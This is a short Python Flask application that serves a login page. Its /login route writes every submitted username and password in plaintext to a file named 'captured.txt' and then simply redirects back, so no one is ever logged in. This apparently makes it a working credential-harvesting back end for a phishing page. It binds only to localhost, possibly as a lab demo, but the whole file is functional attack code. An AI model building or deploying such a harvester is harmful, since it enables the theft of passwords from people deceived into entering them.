from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
import os

app = Flask(__name__)

LOG_FILE = "captured.txt"


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    try:
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return redirect(url_for("home"))

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(LOG_FILE, "a") as file:
            file.write(
                f"[{timestamp}] Username: {username} | Password: {password}\n"
            )

        return redirect(url_for("home"))

    except Exception as e:
        return "An error occurred while processing the request."


if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    app.run(host="127.0.0.1", port=8000, debug=False)
